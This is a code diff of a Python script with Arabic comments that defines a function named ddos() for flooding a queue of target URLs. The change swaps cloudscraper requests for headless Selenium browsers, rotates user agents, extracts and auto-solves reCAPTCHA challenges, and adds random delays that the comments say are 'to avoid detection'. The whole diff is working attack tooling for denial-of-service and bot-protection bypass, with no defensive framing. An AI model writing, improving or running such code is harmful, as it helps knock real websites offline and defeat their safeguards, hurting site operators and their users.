@@ -1,16 +1,15 @@
-import requests
-import threading
-import random
-import cloudscraper
+from selenium import webdriver
+from selenium.webdriver.common.by import By
 import time
+import random
 from queue import Queue
+import threading
 
 # قائمة رؤوس المستخدم (User-Agent)
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
 ]
 
 # قائمة عناوين URL المستهدفة
@@ -43,24 +42,32 @@ def ddos():
     """
     إرسال طلبات مع تخطي الحماية.
     """
-    scraper = cloudscraper.create_scraper()  # إنشاء Scraper
     while not urls.empty():
         url = urls.get()
         try:
-            headers = {"User-Agent": random.choice(user_agents)}
-            response = scraper.get(url, headers=headers, timeout=5)  # إرسال الطلب مع تخطي الحماية
+            # استخدام Selenium لمحاكاة المتصفح بشكل كامل
+            options = webdriver.ChromeOptions()
+            options.add_argument(f"user-agent={random.choice(user_agents)}")
+            options.add_argument('--headless')  # تشغيل المتصفح في الخلفية
+            driver = webdriver.Chrome(options=options)
+
+            driver.get(url)
 
             # إذا كان الموقع يحتوي على reCAPTCHA أو شيء مشابه، يمكن حل التحدي هنا
-            if "recaptcha" in response.text:
-                site_key = "site_key_of_the_target"  # استخرج المفتاح من HTML
+            if "recaptcha" in driver.page_source:
+                site_key = driver.find_element(By.XPATH, '//*[contains(@data-sitekey, "")]').get_attribute('data-sitekey')
                 captcha_solution = solve_captcha(site_key, url)
                 if captcha_solution:
-                    response = scraper.get(url, headers=headers, params={"g-recaptcha-response": captcha_solution}, timeout=5)
+                    driver.execute_script(f"document.getElementById('g-recaptcha-response').innerHTML = '{captcha_solution}'")
+                    driver.find_element(By.ID, "submit").click()
 
             # إضافة تأخير عشوائي بين الطلبات لتجنب الكشف
-            time.sleep(random.uniform(0.5, 2.5))  # تأخير بين 0.5 إلى 2.5 ثانية
+            time.sleep(random.uniform(1, 4))  # تأخير بين 1 إلى 4 ثواني
+            driver.quit()
+
             urls.task_done()
-        except requests.exceptions.RequestException:
+        except Exception as e:
+            print(f"Error: {e}")
             urls.task_done()
 
 def main():
